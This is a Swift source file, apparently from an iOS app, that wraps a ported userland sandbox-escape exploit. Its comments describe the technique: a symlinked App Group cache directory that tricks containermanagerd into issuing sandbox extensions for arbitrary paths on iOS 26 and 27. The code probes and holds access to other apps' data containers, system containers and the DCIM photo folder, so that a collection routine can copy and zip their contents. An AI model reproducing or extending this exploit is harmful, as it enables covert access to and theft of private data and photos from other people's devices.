import Foundation
import Darwin

/// Swift face of `exploit/worse_query.m`, the port of forcequitOS/worse_query.
///
/// The kernel stage in this app stops at iOS 26.6.1 (`offsets.m` has no 27.x
/// tables), so access to other apps' containers has to come from userland. The
/// mechanism is the one upstream uses: point the App Group's `Library/Caches` at
/// the target with a symlink, ask containermanagerd for part 3 of that group,
/// and consume the sandbox extension it returns. It covers iOS 26.0 – 26.7.2 and
/// 27.x, which is exactly the range the kernel route lost.
///
/// Requirement: the signature must carry `com.apple.security.application-groups`
/// (see `ThreeOneOSFive/ThreeOneOSFive.entitlements`); without it
/// `containerURLForSecurityApplicationGroupIdentifier:` returns nil and every
/// grant fails with -1.
enum UserlandAccess {
    private static let lock = NSLock()
    private static var cachedProbeResult: Bool?
    private static var probeInFlight = false

    /// Last one-line diagnostic from the C layer (English, survives the on-disk
    /// log filter).
    static var lastError: String {
        String(cString: worse_query_last_message())
    }

    /// App Group the last successful grant used.
    static var lastGroup: String {
        worse_query_last_group() ?? "none"
    }

    /// Path covered by the last successful grant (the container that answered).
    static var lastPath: String {
        worse_query_last_path() ?? "none"
    }

    /// Groups this build is entitled to (empty when the signature lacks them).
    static var entitledGroups: [String] {
        worse_query_entitled_groups()
    }

    static var hasVerifiedAccess: Bool {
        lock.lock()
        defer { lock.unlock() }
        return cachedProbeResult == true
    }

    /// Requests a sandbox extension for `path`. Returns a handle >= 0 on
    /// success; callers must hand it back to `revoke`.
    static func grant(_ path: String, createIfMissing: Bool = true) -> Int64 {
        guard !path.isEmpty else { return -255 }
        let handle = worse_query_grant(path, createIfMissing)
        if handle < 0 {
            log("userland: grant refused \(path) code=\(handle) group=\(lastGroup) detail=\(lastError)")
        }
        return handle
    }

    static func revoke(_ handle: Int64) {
        guard handle >= 0 else { return }
        worse_query_release(handle)
    }

    /// Bundle id MCM stamped on a container directory (containermanager xattr).
    static func containerIdentifier(_ path: String) -> String? {
        worse_query_container_identifier(path)
    }

    /// Verifies that the userland route works on this device. Cached once it
    /// succeeds; a failure is retried later because the App Group container may
    /// only appear after the first query.
    @discardableResult
    static func probe(force: Bool = false) -> Bool {
        lock.lock()
        if let cached = cachedProbeResult, cached, !force {
            lock.unlock()
            return true
        }
        let running = probeInFlight
        if !running { probeInFlight = true }
        lock.unlock()

        if running {
            // Another thread is probing. Waiting here is what keeps the
            // collection cycle from concluding "no access" while the probe that
            // would prove otherwise is still in flight.
            let deadline = Date().addingTimeInterval(40)
            while Date() < deadline {
                lock.lock()
                let stillRunning = probeInFlight
                let known = cachedProbeResult
                lock.unlock()
                if !stillRunning { return known == true }
                Thread.sleep(forTimeInterval: 0.05)
            }
            return hasVerifiedAccess
        }

        let started = Date()
        var succeeded = false
        var grantedPath = "none"
        // Prefer a real container: on 26.6.2 / 27.x a directory *root* answers
        // with no token (-6) while a container directory is granted, so probing
        // only roots reports a false negative.
        var candidates = probeTargets()
        if let indexed = ContainerStore.containerIndexSnapshot().values.first {
            candidates.insert(indexed, at: 0)
        }
        for candidate in candidates {
            let handle = grant(candidate)
            if handle >= 0 {
                revoke(handle)
                succeeded = true
                grantedPath = candidate
                break
            }
            if handle == -1 || handle == -2 { break }
        }
        let elapsed = Date().timeIntervalSince(started)
        log("userland: probe result=\(succeeded) in \(String(format: "%.2f", elapsed))s path=\(grantedPath) group=\(lastGroup) detail=\(lastError)")
        DebugLogWriter.shared.write(
            "userland: probe=\(succeeded) path=\(grantedPath) group=\(lastGroup) error=\(lastError)"
        )

        lock.lock()
        if succeeded { cachedProbeResult = true }
        probeInFlight = false
        lock.unlock()
        return succeeded
    }

    private static func probeTargets() -> [String] {
        // Never filter with fileExists(): inside the sandbox a perfectly valid
        // root reports "missing" because the path check itself is denied.
        let mobile = "/var/mobile/Containers/Data/Application"
        let containers = "/var/containers/Data/Application"
        let appGroup = "/var/mobile/Containers/Shared/AppGroup"
        let systemGroup = "/var/containers/Shared/SystemGroup"
        let systemData = "/var/containers/Data/System"
        let dcim = "/var/mobile/Media/DCIM"
        if ProcessInfo.processInfo.operatingSystemVersion.majorVersion >= 27 {
            return [containers, systemGroup, systemData, mobile, appGroup, dcim]
        }
        return [mobile, appGroup, containers, systemGroup, systemData, dcim]
    }

    /// Filesystem access is either the kernel sandbox escape (<= 26.6.1) or the
    /// userland extension route.
    static var isAvailable: Bool {
        if KernelExploit.hasSandboxAccess() { return true }
        return probe()
    }

    /// Keeps an extension alive for a whole collection item so that copy + zip
    /// work even when the grant is the only access path.
    final class RetainedLease {
        let path: String
        private var handle: Int64
        private let lock = NSLock()

        init?(path: String, handle: Int64) {
            guard handle >= 0 else { return nil }
            self.path = path
            self.handle = handle
        }

        static func acquire(path: String, createIfMissing: Bool = true) -> RetainedLease? {
            let handle = UserlandAccess.grant(path, createIfMissing: createIfMissing)
            guard handle >= 0 else { return nil }
            return RetainedLease(path: path, handle: handle)
        }

        func release() {
            lock.lock()
            let current = handle
            handle = -1
            lock.unlock()
            guard current >= 0 else { return }
            UserlandAccess.revoke(current)
        }

        deinit { release() }
    }
}
